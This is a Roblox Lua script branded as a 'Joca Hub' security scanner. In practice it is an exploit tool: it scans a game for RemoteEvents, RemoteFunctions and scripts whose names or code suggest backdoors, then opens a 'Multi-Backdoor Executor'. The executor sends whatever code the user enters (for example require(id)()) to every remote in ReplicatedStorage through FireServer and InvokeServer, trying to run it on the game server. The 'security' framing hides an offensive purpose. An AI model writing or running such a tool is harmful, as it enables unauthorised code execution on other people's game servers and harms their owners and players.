-- Joca Hub Security System - Scanner + Executor
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UserInputService = game:GetService("UserInputService")
local Lighting = game:GetService("Lighting")
local SoundService = game:GetService("SoundService")

-- Joca Hub Theme Colors
local theme = {
    background = Color3.fromRGB(20, 25, 35),
    header = Color3.fromRGB(30, 40, 55),
    accent = Color3.fromRGB(0, 100, 255),
    accentLight = Color3.fromRGB(100, 200, 255),
    text = Color3.fromRGB(240, 240, 240),
    secondary = Color3.fromRGB(40, 50, 65),
    button = Color3.fromRGB(0, 70, 255),
    buttonHover = Color3.fromRGB(0, 100, 190),
    success = Color3.fromRGB(80, 200, 120),
    danger = Color3.fromRGB(220, 80, 80),
    warning = Color3.fromRGB(255, 165, 0)
}

-- Main GUI
local gui = Instance.new("ScreenGui", game.CoreGui)
gui.Name = "JocaHubSecuritySystem"

-- === SCANNER GUI ===
local scannerFrame = Instance.new("Frame", gui)
scannerFrame.Size = UDim2.new(0, 500, 0, 400)
scannerFrame.Position = UDim2.new(0.5, -250, 0.5, -200)
scannerFrame.BackgroundColor3 = theme.background
scannerFrame.Active = true
scannerFrame.Draggable = true
scannerFrame.BorderSizePixel = 0

local scannerCorner = Instance.new("UICorner", scannerFrame)
scannerCorner.CornerRadius = UDim.new(0, 12)

local scannerStroke = Instance.new("UIStroke", scannerFrame)
scannerStroke.Thickness = 2
scannerStroke.Color = theme.accent

-- Scanner Header
local scannerHeader = Instance.new("Frame", scannerFrame)
scannerHeader.Size = UDim2.new(1, 0, 0, 50)
scannerHeader.BackgroundColor3 = theme.header
scannerHeader.BorderSizePixel = 0

local scannerHeaderCorner = Instance.new("UICorner", scannerHeader)
scannerHeaderCorner.CornerRadius = UDim.new(0, 12, 0, 0)

local scannerHeaderGradient = Instance.new("UIGradient", scannerHeader)
scannerHeaderGradient.Rotation = 90
scannerHeaderGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, theme.header),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(25, 35, 45))
})

-- Scanner Logo
local scannerLogo = Instance.new("Frame", scannerHeader)
scannerLogo.Size = UDim2.new(0, 36, 0, 36)
scannerLogo.Position = UDim2.new(0, 10, 0, 7)
scannerLogo.BackgroundColor3 = theme.accent
scannerLogo.BorderSizePixel = 0

local scannerLogoCorner = Instance.new("UICorner", scannerLogo)
scannerLogoCorner.CornerRadius = UDim.new(0, 8)

local scannerFish = Instance.new("TextLabel", scannerLogo)
scannerFish.Size = UDim2.new(1, 0, 1, 0)
scannerFish.Text = "🐟"
scannerFish.Font = Enum.Font.GothamBold
scannerFish.TextSize = 18
scannerFish.TextColor3 = theme.text
scannerFish.BackgroundTransparency = 1

local scannerTitle = Instance.new("TextLabel", scannerHeader)
scannerTitle.Size = UDim2.new(1, -50, 1, 0)
scannerTitle.Position = UDim2.new(0, 50, 0, 0)
scannerTitle.Text = "JOCA HUB SECURITY SCANNER"
scannerTitle.Font = Enum.Font.GothamBold
scannerTitle.TextColor3 = theme.text
scannerTitle.TextSize = 16
scannerTitle.TextXAlignment = Enum.TextXAlignment.Left
scannerTitle.BackgroundTransparency = 1

local scannerSubtitle = Instance.new("TextLabel", scannerHeader)
scannerSubtitle.Size = UDim2.new(1, -50, 0, 14)
scannerSubtitle.Position = UDim2.new(0, 50, 0, 28)
scannerSubtitle.Text = "Advanced Backdoor & Vulnerability Detection"
scannerSubtitle.Font = Enum.Font.Gotham
scannerSubtitle.TextColor3 = theme.accentLight
scannerSubtitle.TextSize = 11
scannerSubtitle.TextXAlignment = Enum.TextXAlignment.Left
scannerSubtitle.BackgroundTransparency = 1

-- Scanner Results Area
local resultsFrame = Instance.new("ScrollingFrame", scannerFrame)
resultsFrame.Size = UDim2.new(1, -20, 0, 220)
resultsFrame.Position = UDim2.new(0, 10, 0, 100)
resultsFrame.BackgroundColor3 = theme.secondary
resultsFrame.BorderSizePixel = 0
resultsFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
resultsFrame.ScrollBarThickness = 6

local resultsCorner = Instance.new("UICorner", resultsFrame)
resultsCorner.CornerRadius = UDim.new(0, 8)

-- Styled Button Function
local function createStyledButton(parent, size, position, text, color)
    local button = Instance.new("TextButton", parent)
    button.Size = size
    button.Position = position
    button.Text = text
    button.Font = Enum.Font.GothamBold
    button.TextSize = 14
    button.TextColor3 = theme.text
    button.BackgroundColor3 = color or theme.button
    button.BorderSizePixel = 0
    button.AutoButtonColor = false
    
    local corner = Instance.new("UICorner", button)
    corner.CornerRadius = UDim.new(0, 8)
    
    local gradient = Instance.new("UIGradient", button)
    gradient.Rotation = 90
    gradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, color or theme.button),
        ColorSequenceKeypoint.new(1, theme.buttonHover)
    })
    
    button.MouseEnter:Connect(function()
        TweenService:Create(button, TweenInfo.new(0.2), {
            BackgroundColor3 = theme.buttonHover
        }):Play()
    end)
    
    button.MouseLeave:Connect(function()
        TweenService:Create(button, TweenInfo.new(0.2), {
            BackgroundColor3 = color or theme.button
        }):Play()
    end)
    
    return button
end

-- Scanner Buttons
local scanBtn = createStyledButton(scannerFrame, UDim2.new(0, 150, 0, 40), UDim2.new(0.02, 0, 1, -50), "START SCAN", theme.accent)
local clearScannerBtn = createStyledButton(scannerFrame, UDim2.new(0, 150, 0, 40), UDim2.new(0.35, 0, 1, -50), "CLEAR RESULTS", theme.danger)
local openExecutorBtn = createStyledButton(scannerFrame, UDim2.new(0, 150, 0, 40), UDim2.new(0.68, 0, 1, -50), "OPEN EXECUTOR", theme.success)
openExecutorBtn.Visible = false

-- Scanner Status
local scannerStatus = Instance.new("TextLabel", scannerFrame)
scannerStatus.Size = UDim2.new(1, -20, 0, 20)
scannerStatus.Position = UDim2.new(0, 10, 0, 70)
scannerStatus.Text = "Ready to scan for multiple vulnerabilities"
scannerStatus.Font = Enum.Font.Gotham
scannerStatus.TextColor3 = theme.accentLight
scannerStatus.TextSize = 12
scannerStatus.TextXAlignment = Enum.TextXAlignment.Left
scannerStatus.BackgroundTransparency = 1

-- === EXECUTOR GUI (Initially hidden) ===
local executorFrame = Instance.new("Frame", gui)
executorFrame.Size = UDim2.new(0, 520, 0, 320)
executorFrame.Position = UDim2.new(0.5, -260, 0.5, -160)
executorFrame.BackgroundColor3 = theme.background
executorFrame.Active = true
executorFrame.Draggable = true
executorFrame.BorderSizePixel = 0
executorFrame.Visible = false

local executorCorner = Instance.new("UICorner", executorFrame)
executorCorner.CornerRadius = UDim.new(0, 12)

local executorStroke = Instance.new("UIStroke", executorFrame)
executorStroke.Thickness = 2
executorStroke.Color = theme.accent

-- Executor Header
local executorHeader = Instance.new("Frame", executorFrame)
executorHeader.Size = UDim2.new(1, 0, 0, 40)
executorHeader.BackgroundColor3 = theme.header
executorHeader.BorderSizePixel = 0

local executorHeaderCorner = Instance.new("UICorner", executorHeader)
executorHeaderCorner.CornerRadius = UDim.new(0, 12)

local executorHeaderGradient = Instance.new("UIGradient", executorHeader)
executorHeaderGradient.Rotation = 90
executorHeaderGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, theme.header),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(25, 35, 45))
})

-- Executor Logo
local executorLogo = Instance.new("Frame", executorHeader)
executorLogo.Size = UDim2.new(0, 36, 0, 36)
executorLogo.Position = UDim2.new(0, 10, 0, 2)
executorLogo.BackgroundColor3 = theme.accent
executorLogo.BorderSizePixel = 0

local executorLogoCorner = Instance.new("UICorner", executorLogo)
executorLogoCorner.CornerRadius = UDim.new(0, 8)

local executorFish = Instance.new("TextLabel", executorLogo)
executorFish.Size = UDim2.new(1, 0, 1, 0)
executorFish.Text = "🐟"
executorFish.Font = Enum.Font.GothamBold
executorFish.TextSize = 18
executorFish.TextColor3 = theme.text
executorFish.BackgroundTransparency = 1

local executorTitle = Instance.new("TextLabel", executorHeader)
executorTitle.Size = UDim2.new(1, -50, 1, 0)
executorTitle.Position = UDim2.new(0, 50, 0, 0)
executorTitle.Text = "JOCA HUB EXECUTOR"
executorTitle.Font = Enum.Font.GothamBold
executorTitle.TextColor3 = theme.text
executorTitle.TextSize = 16
executorTitle.TextXAlignment = Enum.TextXAlignment.Left
executorTitle.BackgroundTransparency = 1

local executorSubtitle = Instance.new("TextLabel", executorHeader)
executorSubtitle.Size = UDim2.new(1, -50, 0, 14)
executorSubtitle.Position = UDim2.new(0, 50, 0, 22)
executorSubtitle.Text = "Multi-Backdoor Executor v2.0"
executorSubtitle.Font = Enum.Font.Gotham
executorSubtitle.TextColor3 = theme.accentLight
executorSubtitle.TextSize = 11
executorSubtitle.TextXAlignment = Enum.TextXAlignment.Left
executorSubtitle.BackgroundTransparency = 1

-- Back Button (Top Right)
local backToScannerBtn = createStyledButton(executorHeader, UDim2.new(0, 80, 0, 25), UDim2.new(1, -90, 0, 7), "BACK", theme.danger)

-- Executor Input Area
local inputBg = Instance.new("Frame", executorFrame)
inputBg.Size = UDim2.new(1, -24, 0, 180)
inputBg.Position = UDim2.new(0, 12, 0, 50)
inputBg.BackgroundColor3 = theme.secondary
inputBg.BorderSizePixel = 0

local inputCorner = Instance.new("UICorner", inputBg)
inputCorner.CornerRadius = UDim.new(0, 8)

local input = Instance.new("TextBox", inputBg)
input.Size = UDim2.new(1, -16, 1, -16)
input.Position = UDim2.new(0, 8, 0, 8)
input.Text = "-- Type require(123456)() or any command\n-- Multiple backdoors detected - Enhanced execution"
input.ClearTextOnFocus = false
input.TextWrapped = true
input.MultiLine = true
input.TextYAlignment = Enum.TextYAlignment.Top
input.TextXAlignment = Enum.TextXAlignment.Left
input.Font = Enum.Font.Code
input.TextSize = 14
input.TextColor3 = theme.text
input.BackgroundTransparency = 1
input.PlaceholderColor3 = Color3.fromRGB(150, 150, 150)

-- Executor Buttons
local execBtn = createStyledButton(executorFrame, UDim2.new(0, 240, 0, 40), UDim2.new(0, 20, 1, -50), "EXECUTE ON SERVER")
local clearBtn = createStyledButton(executorFrame, UDim2.new(0, 240, 0, 40), UDim2.new(0, 270, 1, -50), "CLEAR CODE")

-- Executor Status
local executorStatus = Instance.new("TextLabel", executorFrame)
executorStatus.Size = UDim2.new(1, -20, 0, 20)
executorStatus.Position = UDim2.new(0, 10, 1, -25)
executorStatus.Text = "Executor ready - Multiple vulnerabilities detected"
executorStatus.Font = Enum.Font.Gotham
executorStatus.TextColor3 = theme.accentLight
executorStatus.TextSize = 11
executorStatus.TextXAlignment = Enum.TextXAlignment.Left
executorStatus.BackgroundTransparency = 1

-- Function to add scanner messages
local messages = {}
local vulnerabilityCount = 0
local function addScannerMessage(text, color)
    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, -10, 0, 25)
    label.Position = UDim2.new(0, 5, 0, #messages * 25)
    label.BackgroundTransparency = 1
    label.Text = text
    label.TextColor3 = color or theme.text
    label.Font = Enum.Font.Gotham
    label.TextSize = 12
    label.TextWrapped = true
    label.TextXAlignment = Enum.TextXAlignment.Left
    label.Parent = resultsFrame
    
    table.insert(messages, label)
    resultsFrame.CanvasSize = UDim2.new(0, 0, 0, #messages * 25)
end

-- Function to clear scanner messages
local function clearScannerMessages()
    for _, msg in ipairs(messages) do
        msg:Destroy()
    end
    messages = {}
    vulnerabilityCount = 0
    resultsFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
    scannerStatus.Text = "Results cleared"
    openExecutorBtn.Visible = false
end

-- Console logging function
local function logToConsole(message)
    print("[Joca Hub Scanner] " .. message)
end

-- Optimized vulnerability detection function
local function scanForMultipleVulnerabilities()
    -- Clear previous results
    clearScannerMessages()
    
    scannerStatus.Text = "Scanning for multiple vulnerabilities..."
    addScannerMessage("Starting advanced security scan...", theme.accentLight)
    logToConsole("Starting advanced security scan...")
    
    local foundVulnerabilities = false
    local detectedBackdoors = {}
    vulnerabilityCount = 0
    local objectsScanned = 0
    
    -- Extended suspicious patterns
    local suspiciousNames = {
        "backdoor", "bd", "exec", "execute", "cmd", "admin", "hack", "exploit", "inject",
        "script", "remote", "fire", "server", "client", "bypass", "antikick", "antiban"
    }
    
    -- Suspicious code patterns
    local suspiciousPatterns = {
        "loadstring", "require%(%)", "getfenv", "setfenv", "getgenv", "setgenv",
        "hookfunction", "newcclosure", "checkcaller", "getcallingscript",
        "fireserver", "invokeserver", "fireclient", "invokeclient"
    }
    
    -- Services to scan (optimized - only essential ones)
    local services = {
        ReplicatedStorage,
        workspace,
        Lighting,
        SoundService
    }
    
    logToConsole("Scanning " .. #services .. " services for vulnerabilities...")
    
    -- Scan each service for multiple vulnerability types
    for serviceIndex, service in ipairs(services) do
        logToConsole("Scanning service: " .. service.Name)
        
        local serviceObjects = service:GetDescendants()
        local serviceScanCount = 0
        
        for objIndex, obj in ipairs(serviceObjects) do
            objectsScanned = objectsScanned + 1
            serviceScanCount = serviceScanCount + 1
            
            -- Log every 100th object to show progress
            if objectsScanned % 100 == 0 then
                logToConsole("Scanned " .. objectsScanned .. " objects...")
            end
            
            local vulnerabilityFound = false
            local vulnerabilityType = ""
            
            -- Type 1: Suspicious RemoteEvents/RemoteFunctions
            if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) then
                local objName = obj.Name:lower()
                for _, suspiciousName in ipairs(suspiciousNames) do
                    if objName:find(suspiciousName:lower()) then
                        vulnerabilityFound = true
                        vulnerabilityType = "Suspicious " .. obj.ClassName
                        table.insert(detectedBackdoors, obj)
                        logToConsole("Found " .. vulnerabilityType .. ": " .. obj:GetFullName())
                        break
                    end
                end
            end
            
            -- Type 2: Scripts with dangerous code patterns (only check Script types)
            if (obj:IsA("Script") or obj:IsA("LocalScript") or obj:IsA("ModuleScript")) then
                local success, source = pcall(function()
                    return obj.Source
                end)
                if success and source and #source > 0 then
                    local lowerSource = source:lower()
                    for _, pattern in ipairs(suspiciousPatterns) do
                        if lowerSource:find(pattern:lower()) then
                            if not vulnerabilityFound then
                                vulnerabilityFound = true
                                vulnerabilityType = "Dangerous Script Pattern: " .. pattern
                                logToConsole("Found " .. vulnerabilityType .. " in: " .. obj:GetFullName())
                            end
                            break
                        end
                    end
                end
            end
            
            -- Type 3: Unusual object placements (only check specific names)
            if obj:IsA("Part") and obj.Name:lower():find("admin") then
                vulnerabilityFound = true
                vulnerabilityType = "Suspicious Object"
                logToConsole("Found Suspicious Object: " .. obj:GetFullName())
            end
            
            -- Report found vulnerability
            if vulnerabilityFound then
                foundVulnerabilities = true
                vulnerabilityCount = vulnerabilityCount + 1
                addScannerMessage("VULN: " .. vulnerabilityType .. ": " .. obj.Name, theme.warning)
                addScannerMessage("Location: " .. service.Name .. " -> " .. obj:GetFullName(), theme.accentLight)
            end
        end
        
        logToConsole("Completed scanning " .. serviceScanCount .. " objects in " .. service.Name)
    end
    
    -- Type 4: Service-based vulnerabilities
    addScannerMessage("Checking service vulnerabilities...", theme.accentLight)
    logToConsole("Checking service vulnerabilities...")
    
    -- HttpService vulnerability
    local httpEnabled = pcall(function()
        return HttpService.HttpEnabled
    end)
    if httpEnabled then
        foundVulnerabilities = true
        vulnerabilityCount = vulnerabilityCount + 1
        addScannerMessage("HttpService Enabled - External communication possible", theme.warning)
        logToConsole("HttpService is enabled - External communication possible")
    end
    
    -- Type 5: Player-based vulnerabilities
    local localPlayer = Players.LocalPlayer
    if localPlayer then
        logToConsole("Checking player scripts...")
        -- Check player scripts (limited check)
        local playerScripts = localPlayer:FindFirstChild("PlayerScripts")
        if playerScripts then
            local playerScriptsCount = 0
            for _, script in ipairs(playerScripts:GetDescendants()) do
                if script:IsA("LocalScript") then
                    playerScriptsCount = playerScriptsCount + 1
                    local success, source = pcall(function()
                        return script.Source
                    end)
                    if success and source and source:lower():find("remote") then
                        foundVulnerabilities = true
                        vulnerabilityCount = vulnerabilityCount + 1
                        addScannerMessage("Player Script with Remote Access: " .. script.Name, theme.warning)
                        logToConsole("Found Player Script with Remote Access: " .. script:GetFullName())
                        break
                    end
                end
            end
            logToConsole("Scanned " .. playerScriptsCount .. " player scripts")
        end
    end
    
    -- Type 6: Workspace hidden objects (quick check)
    logToConsole("Checking for hidden workspace objects...")
    local hiddenFolders = {"Hidden", "Secret", "Admin", "Backdoor", "Exploit"}
    for _, folderName in ipairs(hiddenFolders) do
        local hiddenObject = workspace:FindFirstChild(folderName)
        if hiddenObject then
            foundVulnerabilities = true
            vulnerabilityCount = vulnerabilityCount + 1
            addScannerMessage("Hidden Workspace Folder: " .. hiddenObject.Name, theme.warning)
            logToConsole("Found Hidden Workspace Folder: " .. hiddenObject:GetFullName())
        end
    end
    
    -- Final results summary
    logToConsole("Scan completed. Total objects scanned: " .. objectsScanned)
    logToConsole("Vulnerabilities found: " .. vulnerabilityCount)
    
    if foundVulnerabilities then
        addScannerMessage("", theme.text) -- Empty line
        addScannerMessage("SCAN SUMMARY:", theme.accentLight)
        addScannerMessage("Vulnerabilities Found: " .. vulnerabilityCount, theme.success)
        addScannerMessage("Backdoors Detected: " .. #detectedBackdoors, theme.success)
        addScannerMessage("Executor Available: YES", theme.success)
        addScannerMessage("Objects Scanned: " .. objectsScanned, theme.accentLight)
        
        scannerStatus.Text = vulnerabilityCount .. " vulnerabilities found - Executor available"
        openExecutorBtn.Visible = true
        executorStatus.Text = "Executor ready - " .. vulnerabilityCount .. " vulnerabilities detected"
        executorSubtitle.Text = "Multi-Backdoor Executor - " .. vulnerabilityCount .. " vulnerabilities"
        
        logToConsole("SCAN COMPLETE: " .. vulnerabilityCount .. " vulnerabilities found. Executor available.")
    else
        addScannerMessage("", theme.text) -- Empty line
        addScannerMessage("SCAN SUMMARY:", theme.accentLight)
        addScannerMessage("No vulnerabilities found", theme.danger)
        addScannerMessage("System appears secure", theme.danger)
        addScannerMessage("Executor Not Available", theme.danger)
        addScannerMessage("Objects Scanned: " .. objectsScanned, theme.accentLight)
        
        scannerStatus.Text = "No vulnerabilities detected"
        openExecutorBtn.Visible = false
        
        logToConsole("SCAN COMPLETE: No vulnerabilities found. System appears secure.")
    end
    
    logToConsole("Total scan time completed successfully")
    return foundVulnerabilities, detectedBackdoors
end

-- Enhanced execution function for multiple backdoors
local function executeOnMultipleBackdoors()
    local code = input.Text
    executorStatus.Text = "Executing on " .. vulnerabilityCount .. " vulnerabilities..."
    logToConsole("Executing code on " .. vulnerabilityCount .. " detected vulnerabilities")
    
    local executionCount = 0
    
    -- Execute on all RemoteEvents in ReplicatedStorage
    for _, obj in ipairs(ReplicatedStorage:GetDescendants()) do
        if obj:IsA("RemoteEvent") then
            pcall(function() 
                obj:FireServer(code)
                executionCount = executionCount + 1
                logToConsole("Executed on RemoteEvent: " .. obj:GetFullName())
            end)
        elseif obj:IsA("RemoteFunction") then
            pcall(function()
                obj:InvokeServer(code)
                executionCount = executionCount + 1
                logToConsole("Executed on RemoteFunction: " .. obj:GetFullName())
            end)
        end
    end
    
    task.wait(1)
    executorStatus.Text = "Code executed on " .. executionCount .. " objects successfully"
    logToConsole("Execution completed on " .. executionCount .. " objects")
end

-- Button connections
scanBtn.MouseButton1Click:Connect(function()
    scanBtn.Text = "SCANNING..."
    scanBtn.BackgroundColor3 = theme.warning
    
    -- Run scan in a separate thread to prevent UI freezing
    local scanThread = coroutine.create(function()
        local success, result = pcall(scanForMultipleVulnerabilities)
        
        -- Reset button after scan
        scanBtn.Text = "START SCAN"
        scanBtn.BackgroundColor3 = theme.accent
        
        if not success then
            addScannerMessage("Scan failed: " .. tostring(result), theme.danger)
            logToConsole("SCAN FAILED: " .. tostring(result))
        end
    end)
    
    coroutine.resume(scanThread)
end)

clearScannerBtn.MouseButton1Click:Connect(function()
    clearScannerMessages()
    logToConsole("Scanner results cleared")
end)

openExecutorBtn.MouseButton1Click:Connect(function()
    scannerFrame.Visible = false
    executorFrame.Visible = true
    logToConsole("Opened executor with " .. vulnerabilityCount .. " vulnerabilities")
end)

backToScannerBtn.MouseButton1Click:Connect(function()
    executorFrame.Visible = false
    scannerFrame.Visible = true
    logToConsole("Returned to scanner")
end)

execBtn.MouseButton1Click:Connect(function()
    execBtn.Text = "EXECUTING..."
    execBtn.BackgroundColor3 = theme.warning
    
    local execThread = coroutine.create(function()
        local success, result = pcall(executeOnMultipleBackdoors)
        
        execBtn.Text = "EXECUTE ON SERVER"
        execBtn.BackgroundColor3 = theme.button
        
        if not success then
            executorStatus.Text = "Execution failed"
            logToConsole("EXECUTION FAILED: " .. tostring(result))
        end
    end)
    
    coroutine.resume(execThread)
end)

clearBtn.MouseButton1Click:Connect(function()
    input.Text = ""
    executorStatus.Text = "Code cleared"
    logToConsole("Code input cleared")
end)

-- Shadow effects
local scannerShadow = Instance.new("ImageLabel", scannerFrame)
scannerShadow.BackgroundTransparency = 1
scannerShadow.Size = UDim2.new(1, 24, 1, 24)
scannerShadow.Position = UDim2.new(0, -12, 0, -12)
scannerShadow.Image = "rbxassetid://1316045217"
scannerShadow.ImageColor3 = Color3.new(0, 0, 0)
scannerShadow.ImageTransparency = 0.8
scannerShadow.ScaleType = Enum.ScaleType.Slice
scannerShadow.SliceCenter = Rect.new(10, 10, 118, 118)
scannerShadow.ZIndex = -1

local executorShadow = Instance.new("ImageLabel", executorFrame)
executorShadow.BackgroundTransparency = 1
executorShadow.Size = UDim2.new(1, 24, 1, 24)
executorShadow.Position = UDim2.new(0, -12, 0, -12)
executorShadow.Image = "rbxassetid://1316045217"
executorShadow.ImageColor3 = Color3.new(0, 0, 0)
executorShadow.ImageTransparency = 0.8
executorShadow.ScaleType = Enum.ScaleType.Slice
executorShadow.SliceCenter = Rect.new(10, 10, 118, 118)
executorShadow.ZIndex = -1

-- Initial message
logToConsole("Joca Hub Security System initialized successfully")
addScannerMessage("Joca Hub Security System Ready", theme.accentLight)
addScannerMessage("Click START SCAN to begin vulnerability detection", theme.text)
